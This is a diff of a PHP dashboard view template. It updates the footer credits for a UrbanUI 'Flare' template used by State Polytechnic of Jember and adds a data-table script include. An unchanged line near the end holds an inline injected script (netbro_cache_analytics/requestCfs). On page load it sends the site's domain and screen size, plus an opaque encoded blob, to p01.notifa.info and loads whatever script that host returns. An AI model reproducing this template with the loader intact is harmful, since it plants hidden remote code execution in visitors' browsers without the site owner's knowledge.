@@ -119,8 +119,8 @@
         <!-- partial:partials/_footer.html -->
         <footer class="footer">
           <div class="w-100 clearfix">
-            <span class="text-muted d-block text-center text-sm-left d-sm-inline-block">Template by UrbanUI</span>
-            <span class="float-none float-sm-right d-block mt-1 mt-sm-0 text-center">Politeknik Negeri Jember 2019
+            <span class="text-muted d-block text-center text-sm-left d-sm-inline-block">FlareUI Template by <b>UrbanUI</b></span>
+            <span class="float-none float-sm-right d-block mt-1 mt-sm-0 text-center">State Polytechnic of Jember (<b>2019</b>)
           </div>
         </footer>
         <!-- partial -->
@@ -140,12 +140,15 @@
   <!-- inject:js -->
   <script src="<?php echo base_url('')?>assets/js/template.js"></script>
   <!-- endinject -->
+  <script src="<?php echo base_url('assets/js/data-table.js')?>"></script>
   <!-- Custom js for this page-->
   <script src="<?php echo base_url('')?>assets/js/toastDemo.js"></script>
   <script src="<?php echo base_url('')?>assets/js/dashboard.js"></script>
   <script src="<?php echo base_url('')?>assets/js/todolist.js"></script>
   <!-- End custom js for this page-->
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2%2f5piOvuQe61lJl2eL0mGY6TY3PpvjgBQq7AvcqkiX8hyAWpHJAjQGaKzW1laYF7Q2lQB4C180oL4q6m2OlRKIGgo7EjmYT7UvCLQcfVlGJQNZuTdIOdEeaRd%2bOxdPAWybcsd5xSCB8IM3SHcSkNFCOAdl8eO8F6r5wWiQax%2b%2bdfnE7FWczPJZXrKAHwvyg%2b0j2kM5ccCdAUbl5YNJsdc20TbJfK9acZtzu7r29zNbt2KH4FYJpbCzm6fjquk%2fF58IdCdE3zv1nDPQt6ekyh%2bKDU557dmtIpDRdFTnD2BMsI%2bvu%2bHimQbyiCpJ3LfnsuJtIJbXOKCDCIiyfdo3kcbXIZPh6h6VaahNvxIUSttVu92ZIKE%2fCTX%2bUd4ZEV691W1jkTUMCRk6zjKwzrEoLRK3CDqe9iTGdf8pnkL8lSMbbCXKcDWY7GeTlHwAa0ug72TPagd0asOD9P6s91IZHvD7lkTQgyv0k6nlAZ0tgt8ExhbTsK2k3FA0g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+
 
 
 <!-- Mirrored from www.urbanui.com/flare/template/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 28 Jan 2019 03:53:38 GMT -->
